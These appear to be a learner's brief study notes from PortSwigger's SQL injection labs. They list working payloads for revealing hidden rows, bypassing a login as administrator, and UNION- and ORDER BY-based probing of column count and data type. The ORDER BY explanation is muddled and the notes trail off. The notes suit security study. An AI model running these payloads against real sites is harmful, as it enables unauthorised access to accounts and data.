SQL INJECTION - Portswigger Notes
-----------------



1. to find hidden data 
   ` ' OR 1=1--`
   
   

2. Login bypass
    `administrator'--`
   
    
   
   ## Using UNION
   
   1.to find no. of cols:
    i) ' UNION select NULL,NULL,NULL--
   
        no.of NULL's is no. of cols ->200 response
   
    ii) ' ORDER BY 1--
   
        no. determines cols. -> if shown internal error, it' correct value

3. to identify datatype of column
    ' UNION select NULL,'a',NULL
    i) if error its not string
    ii) else its string
    can be analysed by -> ' order by 1--

5. retrieving data from other table
